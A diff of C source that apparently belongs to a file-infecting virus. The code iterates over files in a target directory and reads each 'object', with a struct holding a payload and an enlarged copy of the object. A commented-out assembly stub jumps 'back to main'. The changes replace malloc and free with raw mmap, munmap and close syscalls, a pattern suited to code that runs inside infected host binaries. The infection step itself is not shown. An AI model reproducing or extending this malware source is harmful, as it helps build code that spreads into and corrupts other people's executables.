@@ -3,25 +3,20 @@
 void clear_env(t_env *env)
 {
 	if (env->obj_cpy)
-		free(env->obj_cpy);
+		syscall_munmap(env->obj_cpy, env->new_obj_size + 1);
 	if (env->payload_content)
-		free(env->payload_content);
-	/*if (env->obj_name) {
-		free(env->obj_name);
-	}*/
-	//free(env);
+		syscall_munmap(env->payload_content, env->payload_size + 16);
+	if (env->obj_name) {
+		syscall_munmap(env->obj_name, env->obj_name_size);
+	}
 }
 
 
 t_env env;
 t_env *set_env() {
-	// create env
-	/*if ((env = (t_env *)malloc(sizeof(t_env))) == NULL) {
-		if (DEBUG) printf("Error: can't allocate memory.\n");
-		return NULL;
-	}*/
 	env.obj = NULL;
-	//env.obj_name = NULL;
+	env.obj_name = NULL;
+	env.obj_name_size = 0;
 	env.obj_cpy = NULL;
 	env.obj_size = 0;
 	env.new_obj_size = 0;
@@ -53,15 +48,18 @@ int listdir(char *target) {
 				if ((env = set_env()) == NULL) {
 					return -1;
 				}
-				ft_bzero(env->obj_name, 1024);
+				env->obj_name_size = ft_strlen(target) + ft_strlen(dir.d_name) + 1;
+				if ((env->obj_name = syscall_mmap(0, env->obj_name_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
+					return -1;
+				}
+				ft_bzero(env->obj_name, env->obj_name_size);
 				ft_strcpy(env->obj_name, target);
 				ft_strcat(env->obj_name, dir.d_name);
 				read_obj(env);
 				clear_env(env);
 			}
 		}
-		//free(dir);
-		close(d);
+		syscall_close(d);
 	}
 	return 0;
 }
@@ -116,5 +114,6 @@ int main(void) {
 		// jump back to main
 		"jmp . + 5 + 0x42424242 \n"
 	);*/
+
 	return 0;
 }
